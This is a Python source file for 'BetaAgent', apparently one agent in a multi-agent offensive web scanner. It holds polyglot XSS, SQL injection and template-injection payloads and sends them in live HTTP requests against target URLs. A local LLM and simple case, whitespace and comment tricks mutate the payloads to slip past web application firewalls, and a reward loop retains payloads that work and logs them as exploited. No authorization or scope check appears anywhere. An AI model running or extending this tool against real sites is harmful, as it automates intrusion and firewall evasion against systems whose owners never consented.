import asyncio
import random
from backend.core.hive import BaseAgent, EventType, HiveEvent
from backend.core.protocol import JobPacket, ResultPacket, AgentID, TaskPriority, ModuleConfig, TaskTarget

from backend.ai.cortex import CortexEngine, get_cortex_engine
import json

class BetaAgent(BaseAgent):
    """
    AGENT BETA: THE BREAKER
    Role: Heavy Offensive Operations.
    Capabilities:
    - Polyglot Payloads.
    - WAF Mutation Engine.
    - Real-time HTTP attack execution.
    """
    def __init__(self, bus):
        super().__init__("agent_beta", bus)
        
        # CORTEX AI Integration (Local Ollama)
        try:
            self.ai = get_cortex_engine()
        except Exception:self.ai = None

        
        # SOTA: Polyglots triggering multiple parsers
        self.polyglots = [
            "javascript://%250Aalert(1)//\"/*'*/-->", # XSS + JS
            "' OR 1=1 UNION SELECT 1,2,3--",         # SQLi
            "{{7*7}}{% debug %}"                     # SSTI
        ]
        # Governance: throttle flag from Zeta
        self._throttled = False

    async def setup(self):
        self.bus.subscribe(EventType.JOB_ASSIGNED, self.handle_job)
        self.bus.subscribe(EventType.VULN_CANDIDATE, self.handle_candidate)
        self.bus.subscribe(EventType.JOB_COMPLETED, self.handle_sigma_payloads)
        # Governance: respond to Zeta's control signals
        self.bus.subscribe(EventType.CONTROL_SIGNAL, self.handle_control_signal)

    async def handle_control_signal(self, event: HiveEvent):
        """Respond to Zeta governance signals."""
        signal = event.payload.get("signal", "")
        if signal in ["THROTTLE", "STEALTH_MODE"]:
            self._throttled = True
            print(f"[{self.name}] Governance: {signal} received. Throttling attacks.")
        elif signal == "RESUME":
            self._throttled = False

    async def handle_candidate(self, event: HiveEvent):
        # Handle polyglot injections on candidate detection
        payload = event.payload
        url = payload.get("url")
        tag = payload.get("tag")
        
        if tag == "API":
            print(f"[{self.name}] Intercepted API Candidate: {url}. Recall Phase Initiated.")
            
            # RECALL tactics from Kappa (V6 Learning Loop)
            from backend.core.orchestrator import HiveOrchestrator
            kappa = HiveOrchestrator.active_agents.get("KAPPA")
            
            best_payload = random.choice(self.polyglots) # Default
            if kappa:
                try:
                    results = await kappa.recall_tactics(f"Exploit for {payload.get('type', 'vulnerability')} on {url}")
                    if results:
                        best_payload = results[0].get("payload", best_payload)
                        print(f"[{self.name}] [RECALL SUCCESS] Reusing verified payload: {best_payload}")
                except Exception as e:
                    print(f"[{self.name}] [RECALL ERROR] {e}")

            mutated_polyglot = await self.waf_mutate(best_payload)
            print(f"[{self.name}] >> AI Mutation Strategy: {mutated_polyglot}")
            
            # FIXED: Actually execute the attack via real HTTP requests
            await self._execute_real_attack(url, mutated_polyglot, scan_id=event.scan_id)

    async def handle_job(self, event: HiveEvent):
        payload = event.payload
        try:
            packet = JobPacket(**payload)
        except Exception:return

        if packet.config.agent_id != AgentID.BETA:
            return

        print(f"[{self.name}] Received Breaker Job {packet.id}. Executing direct assault on {packet.target.url}")
        
        # FIXED: Beta now executes attacks directly when receiving its own jobs
        # Execute polyglot payloads directly against the target
        target_url = packet.target.url
        for polyglot in self.polyglots:
            mutated = await self.waf_mutate(polyglot)
            await self._execute_real_attack(target_url, mutated, scan_id=event.scan_id)

    async def handle_sigma_payloads(self, event: HiveEvent):
        """Intercepts Sigma's payload shipments and executes the assault."""
        if event.source != "agent_sigma": return
        payload = event.payload
        
        data = payload.get("data", {})
        if "generated_payloads" not in data: return
        
        target_url = payload.get("target_url")
        if not target_url: return
        
        payloads = data["generated_payloads"]
        print(f"[{self.name}] Intercepted {len(payloads)} payloads from Sigma. Commencing RL Adaptive Execution.")
        try:
            import aiohttp
            async with aiohttp.ClientSession() as session:
                async def execute_payload_rl(p, scan_id=None):
                    try:
                        await self.bus.publish(HiveEvent(
                            type=EventType.LIVE_ATTACK,
                            source=self.name,
                            payload={"url": target_url, "arsenal": "Adaptive Fuzzer", "action": "Executing Payload", "payload": p[:50]}
                        ))
                        
                        reward = await self._execute_and_eval(session, target_url, p, scan_id=scan_id)
                        
                        if reward > 0:
                            print(f"[{self.name}] [+ REWARD] Successful payload interaction. Retaining strategy.")
                        else:
                            print(f"[{self.name}] [- PENALTY] Payload failed. Executing AI mutation layer.")
                            mutated = await self.waf_mutate(p)
                            if mutated != p:
                                await self.bus.publish(HiveEvent(
                                    type=EventType.LIVE_ATTACK,
                                    source=self.name,
                                    payload={"url": target_url, "arsenal": "RL Mutation", "action": "Retrying Mutated Payload", "payload": mutated[:50]}
                                ))
                                await self._execute_and_eval(session, target_url, mutated, scan_id=scan_id)
                    except Exception as payload_err:
                        print(f"[{self.name}] [PAYLOAD ERROR] Skipping payload: {payload_err}")
                
                # Execute all AI generated payloads explicitly in parallel
                print(f"[{self.name}] Dispatching {len(payloads)} AI generative payloads concurrently...")
                await asyncio.gather(*[execute_payload_rl(p, event.scan_id) for p in payloads])
        except Exception as session_err:
            print(f"[{self.name}] [SESSION ERROR] Failed to create HTTP session: {session_err}")

    async def _execute_real_attack(self, url: str, payload_str: str, scan_id: str = None):
        """Execute a real HTTP attack against the target with the given payload."""
        import aiohttp
        import time
        from datetime import datetime
        from backend.api.socket_manager import publish_request_event
        
        # Broadcast attack intent
        await self.bus.publish(HiveEvent(
            type=EventType.LIVE_ATTACK,
            source=self.name,
            payload={"url": url, "arsenal": "Polyglot Injector", "action": "Injecting Payload", "payload": payload_str[:50]}
        ))
        
        start_t = time.time()
        try:
            target = url + ("&" if "?" in url else "?") + f"test={payload_str}"
            timeout = aiohttp.ClientTimeout(total=10)
            async with aiohttp.ClientSession(timeout=timeout) as session:
                async with session.get(target) as resp:
                    text = await resp.text()
                    status = resp.status
                    latency = int((time.time() - start_t) * 1000)
                    
                    anomaly = False
                    result = "OK"
                    text_lower = text.lower()
                    p_lower = payload_str.lower()
                    is_malicious = any(k in p_lower for k in ["'", '"', "<", ">", "script", "union", "select", "etc/passwd", "sleep(", "drop "])
                    
                    if status >= 500 or any(kw in text_lower for kw in ["syntax error", "unexpected", "sql", "mysql", "database", "warning"]):
                        anomaly = True
                        result = "ERROR / SYNTAX"
                    elif status == 200 and is_malicious:
                        anomaly = True
                        result = "INJECTION / BYPASS"
                    elif status == 403 or status == 401:
                        result = "WAF BLOCKED"
                    
                    # Publish live telemetry
                    try:
                        await publish_request_event({
                            "timestamp": datetime.now().strftime("%H:%M:%S"),
                            "method": "GET",
                            "endpoint": url.split("?")[0][-30:] if len(url) > 30 else url,
                            "payload": payload_str[:25],
                            "status": status,
                            "latency": latency,
                            "result": result,
                            "anomaly": anomaly
                        }, scan_id=scan_id)
                    except Exception:
                        pass
                    
                    if anomaly:
                        evidence = f"HTTP {status} with payload '{payload_str[:80]}' triggered anomalous response."
                        await self.bus.publish(HiveEvent(
                            type=EventType.VULN_CANDIDATE,
                            source=self.name,
                            payload={
                                "url": url,
                                "payload": payload_str,
                                "description": text[:800],
                                "evidence": evidence
                            }
                        ))
                        print(f"[{self.name}] [HIT] Anomaly detected on {url}: {result}")
        except Exception as e:
            print(f"[{self.name}] [ATTACK ERROR] {e}")

    async def _execute_and_eval(self, session, url: str, p: str, scan_id: str = None):
        """Executes a payload against a target URL and returns an RL reward score."""
        import time
        from datetime import datetime
        from backend.api.socket_manager import publish_request_event
        
        start_t = time.time()
        try:
            # We assume a GET request with query params for this example, but it scales
            target = url + ("&" if "?" in url else "?") + f"test={p}"
            async with session.get(target, timeout=10) as resp:
                text = await resp.text()
                status = resp.status
                latency = int((time.time() - start_t) * 1000)
                
                reward = 0
                evidence = ""
                text_lower = text.lower()
                anomaly = False
                result = "OK"
                p_lower = p.lower()
                is_malicious_payload = any(k in p_lower for k in ["'", '"', "<", ">", "script", "union", "select", "etc/passwd", "sleep(", "drop "])
                
                if status >= 500 or any(kw in text_lower for kw in ["syntax error", "unexpected", "sql", "mysql", "database", "warning"]):
                    reward = 1
                    evidence = "Server threw unhandled logic/syntax error indicating injection vulnerability."
                    anomaly = True
                    result = "ERROR / SYNTAX"
                elif status == 200 and len(text) > 1000 and not is_malicious_payload:
                    reward = 0.5
                    evidence = "Massive payload return size indicating potential data leak (IDOR/BOLA)."
                    anomaly = True
                    result = "DATA LEAK"
                elif status == 200 and is_malicious_payload:
                    reward = 1
                    evidence = "Malicious payload successfully reflected or processed without sanitization (HTTP 200 OK), indicating an injection bypass."
                    anomaly = True
                    result = "INJECTION / BYPASS"
                elif status == 403 or status == 401:
                    result = "WAF BLOCKED"
                    
                # Publish Live Threat Telemetry
                try:
                    await publish_request_event({
                        "timestamp": datetime.now().strftime("%H:%M:%S"),
                        "method": "GET",
                        "endpoint": url.split("?")[0][-30:] if len(url) > 30 else url,
                        "payload": p[:25],
                        "status": status,
                        "latency": latency,
                        "result": result,
                        "anomaly": anomaly
                    }, scan_id=scan_id)
                except Exception:
                    pass
                    
                if reward > 0:
                    # [NEW] Log Exploit Evidence to Supabase Intelligence Backbone
                    # We report a 'VULN_CANDIDATE' which Gamma will audit, 
                    # but we also log the raw exploit interaction for forensic evidence.
                    try:
                        # Report to Supabase vulnerabilities (deduplicated)
                        vuln_id = await self.db.report_vulnerability(
                            scan_id=scan_id or "GLOBAL",
                            endpoint=url,
                            vuln_type=result,
                            severity="HIGH" if reward >= 1 else "MEDIUM",
                            evidence={"payload": p, "response_excerpt": text[:500], "reward": reward},
                            validated_by=self.name
                        )
                        
                        if vuln_id and vuln_id != "CACHED":
                            await self.db.log_exploit_result(vuln_id, {
                                "payload": p,
                                "worker_id": self.name,
                                "status": "EXPLOITED" if reward >= 1 else "PARTIAL",
                                "response": text[:1000],
                                "time_ms": latency
                            })
                    except Exception as db_err:
                        print(f"[{self.name}] DB Logging Error: {db_err}")

                    await self.bus.publish(HiveEvent(
                        type=EventType.VULN_CANDIDATE,
                        source=self.name,
                        payload={
                            "url": url,
                            "payload": p,
                            "description": text[:800],
                            "evidence": evidence
                        }
                    ))
                return reward
        except Exception as e:
            return 0

    async def waf_mutate(self, payload: str) -> str:
        """
        CORTEX AI: WAF Bypass Mutation Engine
        Uses Ollama to generate intelligent WAF evasion variants.
        """
        if self.ai and self.ai.enabled:
            try:
                mutated = await self.ai.mutate_waf_bypass(payload)
                if mutated and mutated != payload:
                    return mutated
            except Exception as e:
                pass

        strategy = random.choice(["case_swap", "whitespace", "comment_split"])
        if strategy == "case_swap":
            return "".join([c.upper() if random.random() > 0.5 else c.lower() for c in payload])
        elif strategy == "whitespace":
            return payload.replace(" ", "/**/%09")
        elif strategy == "comment_split":
            return payload.replace("SELECT", "SEL/**/ECT")
        return payload

    async def _execute_packet(self, packet: JobPacket):
        """FIXED: Execute attack packet by dispatching via event bus to Sigma for arsenal execution."""
        await self.bus.publish(HiveEvent(
            type=EventType.JOB_ASSIGNED,
            source=self.name,
            payload=packet.model_dump()
        ))
